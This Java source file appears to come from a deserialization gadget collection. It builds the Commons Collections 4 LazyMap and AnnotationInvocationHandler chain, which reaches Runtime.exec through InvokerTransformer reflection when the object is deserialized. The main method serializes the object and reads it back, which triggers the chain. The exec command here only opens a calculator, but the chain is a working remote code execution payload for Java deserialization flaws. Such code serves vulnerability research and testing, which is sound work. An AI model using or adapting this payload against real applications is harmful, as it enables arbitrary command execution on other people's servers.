package com.trganda.gadget.lazymap;

import com.trganda.gadget.utils.Reflections;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class LazyMapCC4AnnotationExec {

    public static Object getObject() throws Exception {
        ChainedTransformer fakeTransformer =
                new ChainedTransformer(new Transformer[] {new ConstantTransformer("1")});
        ChainedTransformer chainedTransformer =
                new ChainedTransformer(
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer(
                            "getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer(
                            "invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new Object[0]}),
                    new InvokerTransformer(
                            "exec",
                            new Class[] {String.class},
                            new Object[] {"open -a calculator"}));

        LazyMap lazyMap = (LazyMap) LazyMap.lazyMap(new HashMap<>(), fakeTransformer);

        InvocationHandler handler =
                (InvocationHandler)
                        Reflections.getFirstCtor(
                                        "sun.reflect.annotation.AnnotationInvocationHandler")
                                .newInstance(Override.class, lazyMap);

        Map map =
                (Map)
                        Proxy.newProxyInstance(
                                ClassLoader.getSystemClassLoader(),
                                new Class[] {Map.class},
                                handler);

        InvocationHandler anotherHandler =
                (InvocationHandler)
                        Reflections.getFirstCtor(
                                        "sun.reflect.annotation.AnnotationInvocationHandler")
                                .newInstance(Override.class, map);
        Reflections.setFieldValue(lazyMap, "factory", chainedTransformer);

        return anotherHandler;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(Paths.get("target/LazyMapAnnotationExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(
                        Files.newInputStream(Paths.get("target/LazyMapAnnotationExec.bin")));
        ois.readObject();
    }
}
